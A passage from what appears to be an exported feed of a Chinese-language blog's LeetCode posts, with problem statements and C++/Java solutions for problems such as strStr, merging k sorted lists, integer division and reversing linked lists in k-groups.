<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &quot;((()))&quot;,</span><br><span class="line">  &quot;(()())&quot;,</span><br><span class="line">  &quot;(())()&quot;,</span><br><span class="line">  &quot;()(())&quot;,</span><br><span class="line">  &quot;()()()&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">generate</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, <span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; &amp;result)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="number">0</span> &amp;&amp; right == <span class="number">0</span>)&#123;</span><br><span class="line">            result.push_back(s);</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(left &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            generate(left - <span class="number">1</span>, right, s + <span class="string">'('</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(right &gt; <span class="number">0</span> &amp;&amp; left &lt; right) &#123;</span><br><span class="line">            generate(left, right - <span class="number">1</span>, s + <span class="string">')'</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result;</span><br><span class="line">        </span><br><span class="line">        generate(n, n, s, result);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>28. 实现strStr()</title>
    <url>/2018/09/10/LeetCode/leetcode-000028.%20%E5%AE%9E%E7%8E%B0strStr()/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现 strStr() 函数。</p>
<p>给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回  -1。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: haystack = <span class="string">"hello"</span>, needle = <span class="string">"ll"</span></span><br><span class="line">输出: <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: haystack = <span class="string">"aaaaa"</span>, needle = <span class="string">"bba"</span></span><br><span class="line">输出: -<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。</p>
<p>对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与C语言的 strstr() 以及 Java的 indexOf() 定义相符。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：暴力破解"><a href="#解法一：暴力破解" class="headerlink" title="解法一：暴力破解"></a>解法一：暴力破解</h3><p>直接比较子字符串是否相等</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> L = needle.length(), n = haystack.length();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">0</span>; start &lt; n - L + <span class="number">1</span>; ++start) &#123;</span><br><span class="line">      <span class="keyword">if</span> (haystack.substring(start, start + L).equals(needle)) &#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><ol>
<li>移动 pn 指针，直到 pn 所指向位置的字符与 needle 字符串第一个字符相等。</li>
<li>通过 pn，pL，curr_len 计算匹配长度。</li>
<li>如果完全匹配（即 curr_len == L），返回匹配子串的起始坐标（即 pn - L）。</li>
<li>如果不完全匹配，回溯。使 pn = pn - curr_len + 1， pL = 0， curr_len = 0。</li>
</ol>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> L = needle.length(), n = haystack.length();</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pn = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pn &lt; n - L + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// find the position of the first needle character</span></span><br><span class="line">      <span class="comment">// in the haystack string</span></span><br><span class="line">      <span class="keyword">while</span> (pn &lt; n - L + <span class="number">1</span> &amp;&amp; haystack.charAt(pn) != needle.charAt(<span class="number">0</span>)) ++pn;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// compute the max match string</span></span><br><span class="line">      <span class="keyword">int</span> currLen = <span class="number">0</span>, pL = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (pL &lt; L &amp;&amp; pn &lt; n &amp;&amp; haystack.charAt(pn) == needle.charAt(pL)) &#123;</span><br><span class="line">        ++pn;</span><br><span class="line">        ++pL;</span><br><span class="line">        ++currLen;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// if the whole needle string is found,</span></span><br><span class="line">      <span class="comment">// return its start position</span></span><br><span class="line">      <span class="keyword">if</span> (currLen == L) <span class="keyword">return</span> pn - L;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// otherwise, backtrack</span></span><br><span class="line">      pn = pn - currLen + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>比较haystack中和needle相等的字串的哈希码和needle的哈希码是否相等</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">  <span class="comment">// function to convert character to integer</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">charToInt</span><span class="params">(<span class="keyword">int</span> idx, String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)s.charAt(idx) - (<span class="keyword">int</span>)<span class="string">'a'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> L = needle.length(), n = haystack.length();</span><br><span class="line">    <span class="keyword">if</span> (L &gt; n) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// base value for the rolling hash function</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">26</span>;</span><br><span class="line">    <span class="comment">// modulus value for the rolling hash function to avoid overflow</span></span><br><span class="line">    <span class="keyword">long</span> modulus = (<span class="keyword">long</span>)Math.pow(<span class="number">2</span>, <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// compute the hash of strings haystack[:L], needle[:L]</span></span><br><span class="line">    <span class="keyword">long</span> h = <span class="number">0</span>, ref_h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L; ++i) &#123;</span><br><span class="line">      h = (h * a + charToInt(i, haystack)) % modulus;</span><br><span class="line">      ref_h = (ref_h * a + charToInt(i, needle)) % modulus;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (h == ref_h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const value to be used often : a**L % modulus</span></span><br><span class="line">    <span class="keyword">long</span> aL = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= L; ++i) aL = (aL * a) % modulus;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">1</span>; start &lt; n - L + <span class="number">1</span>; ++start) &#123;</span><br><span class="line">      <span class="comment">// compute rolling hash in O(1) time</span></span><br><span class="line">      h = (h * a - charToInt(start - <span class="number">1</span>, haystack) * aL</span><br><span class="line">              + charToInt(start + L - <span class="number">1</span>, haystack)) % modulus;</span><br><span class="line">      <span class="keyword">if</span> (h == ref_h) <span class="keyword">return</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/implement-strstr/solution/shi-xian-strstr-by-leetcode/" target="_blank" rel="noopener">LeetCode-实现strStr()题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>23. 合并K个排序链表</title>
    <url>/2018/09/10/LeetCode/leetcode-000023.%20%E5%90%88%E5%B9%B6K%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>合并 <em>k</em> 个排序链表，返回合并后的排序链表。请分析和描述算法的复杂度。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">输出: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span> <span class="params">()</span><span class="params">(<span class="keyword">const</span> ListNode *a, <span class="keyword">const</span> ListNode *b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-&gt;val &gt; b-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">mergeKLists</span><span class="params">(<span class="built_in">vector</span>&lt;ListNode *&gt; &amp;lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = lists.size();</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        ListNode node(0), *res = &amp;node;</span><br><span class="line">        priority_queue&lt;ListNode*, <span class="built_in">vector</span>&lt;ListNode*&gt;, cmp&gt; que;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">if</span>(lists[i])</span><br><span class="line">                que.push(lists[i]);</span><br><span class="line">        <span class="keyword">while</span>(!que.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode * p = que.top();</span><br><span class="line">            que.pop();</span><br><span class="line">            res-&gt;next = p;</span><br><span class="line">            res = p;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next)</span><br><span class="line">                que.push(p-&gt;next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>29. 两数相除</title>
    <url>/2018/09/10/LeetCode/leetcode-000029.%20%E4%B8%A4%E6%95%B0%E7%9B%B8%E9%99%A4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个整数，被除数 dividend 和除数 divisor。将两数相除，要求不使用乘法、除法和 mod 运算符。</p>
<p>返回被除数 dividend 除以除数 divisor 得到的商。</p>
<p>整数除法的结果应当截去（truncate）其小数部分，例如：truncate(8.345) = 8 以及 truncate(-2.7335) = -2</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: dividend = <span class="number">10</span>, divisor = <span class="number">3</span></span><br><span class="line">输出: <span class="number">3</span></span><br><span class="line">解释: <span class="number">10</span>/<span class="number">3</span> = truncate(<span class="number">3.33333</span>..) = truncate(<span class="number">3</span>) = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: dividend &#x3D; 7, divisor &#x3D; -3</span><br><span class="line">输出: -2</span><br><span class="line">解释: 7&#x2F;-3 &#x3D; truncate(-2.33333..) &#x3D; -2</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><p>被除数和除数均为 32 位有符号整数。<br>除数不为 0。<br>假设我们的环境只能存储 32 位有符号整数，其数值范围是 [−231,  231 − 1]。本题中，如果除法结果溢出，则返回 231 − 1。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divide</span><span class="params">(<span class="keyword">int</span> dividend, <span class="keyword">int</span> divisor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> divd = dividend, divs = divisor;</span><br><span class="line">        <span class="keyword">if</span>(divisor &lt; <span class="number">0</span>)divs = -divs;</span><br><span class="line">        <span class="keyword">if</span>(dividend &lt; <span class="number">0</span>)divd = -divd;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(divd &gt;= divs) &#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> a = divs;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">1</span>; a &lt;= divd; ++i)&#123;</span><br><span class="line">            	a &lt;&lt;= <span class="number">1</span>;	</span><br><span class="line">            &#125;</span><br><span class="line">                </span><br><span class="line">            res += (<span class="number">1</span> &lt;&lt; (i<span class="number">-2</span>));</span><br><span class="line">            divd -= (divs &lt;&lt; (i<span class="number">-2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">return</span> (dividend &gt; <span class="number">0</span> ^ divisor &gt; <span class="number">0</span>) ? -res : res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>32. 最长有效括号</title>
    <url>/2018/09/10/LeetCode/leetcode-000032.%20%E6%9C%80%E9%95%BF%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包含 <code>&#39;(&#39;</code> 和 <code>&#39;)&#39;</code> 的字符串，找出最长的包含有效括号的子串的长度。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;(()&quot;</span><br><span class="line">输出: 2</span><br><span class="line">解释: 最长有效括号子串为 &quot;()&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;)()())&quot;</span><br><span class="line">输出: 4</span><br><span class="line">解释: 最长有效括号子串为 &quot;()()&quot;</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>31. 下一个排列</title>
    <url>/2018/09/10/LeetCode/leetcode-000031.%20%E4%B8%8B%E4%B8%80%E4%B8%AA%E6%8E%92%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现获取下一个排列的函数，算法需要将给定数字序列重新排列成字典序中下一个更大的排列。</p>
<p>如果不存在下一个更大的排列，则将数字重新排列成最小的排列（即升序排列）。</p>
<p>必须原地修改，只允许使用额外常数空间。</p>
<p>以下是一些例子，输入位于左侧列，其相应输出位于右侧列。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1,2,3 → 1,3,2</span><br><span class="line">3,2,1 → 1,2,3</span><br><span class="line">1,1,5 → 1,5,1</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>24. 两两交换链表中的节点</title>
    <url>/2018/09/10/LeetCode/leetcode-000024.%20%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。</p>
<p><strong>你不能只是单纯的改变节点内部的值</strong>，而是需要实际的进行节点交换。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 1-&gt;2-&gt;3-&gt;4, 你应该返回 2-&gt;1-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">swapPairs</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(head -&gt; next == <span class="literal">NULL</span>) <span class="keyword">return</span> head;</span><br><span class="line">        </span><br><span class="line">        ListNode *first = head;</span><br><span class="line">        ListNode *second = head -&gt; next;</span><br><span class="line">        ListNode *third = second -&gt; next;</span><br><span class="line">        </span><br><span class="line">        second -&gt; next = first;</span><br><span class="line">        first -&gt; next = swapPairs(third);</span><br><span class="line">        <span class="keyword">return</span> second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>25. k个一组翻转链表</title>
    <url>/2018/09/10/LeetCode/leetcode-000025.%20k%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个链表，每 k 个节点一组进行翻转，请你返回翻转后的链表。</p>
<p>k 是一个正整数，它的值小于或等于链表的长度。</p>
<p>如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给你这个链表：<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span>-&gt;<span class="number">5</span></span><br><span class="line"></span><br><span class="line">当 k = <span class="number">2</span> 时，应当返回: <span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">4</span>-&gt;<span class="number">3</span>-&gt;<span class="number">5</span></span><br><span class="line"></span><br><span class="line">当 k = <span class="number">3</span> 时，应当返回: <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">4</span>-&gt;<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>你的算法只能使用常数的额外空间。</li>
<li><strong>你不能只是单纯的改变节点内部的值</strong>，而是需要实际进行节点交换。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ListNode <span class="title">reverse</span><span class="params">(ListNode pre, ListNode next)</span></span>&#123;</span><br><span class="line">        ListNode last = pre.next;</span><br><span class="line">        ListNode cur = last.next;</span><br><span class="line">        <span class="keyword">while</span>(cur != next)&#123;</span><br><span class="line">            last.next = cur.next;</span><br><span class="line">            cur.next = pre.next;</span><br><span class="line">            pre.next = cur;</span><br><span class="line">            cur = last.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == null || k == <span class="number">1</span>) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        ListNode pre = dummy;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != null)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span>(i % k ==<span class="number">0</span>)&#123;</span><br><span class="line">                pre = reverse(pre, head.next);</span><br><span class="line">                head = pre.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                head = head.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>34. 在排序数组中查找元素的第一个和最后一个位置</title>
    <url>/2018/09/10/LeetCode/leetcode-000034.%20%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。</p>
<p>你的算法时间复杂度必须是 O(log n) 级别。</p>
<p>如果数组中不存在目标值，返回 [-1, -1]。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [5,7,7,8,8,10], target &#x3D; 8</span><br><span class="line">输出: [3,4]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [5,7,7,8,8,10], target &#x3D; 6</span><br><span class="line">输出: [-1,-1]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>30. 与所有单词相关联的字串</title>
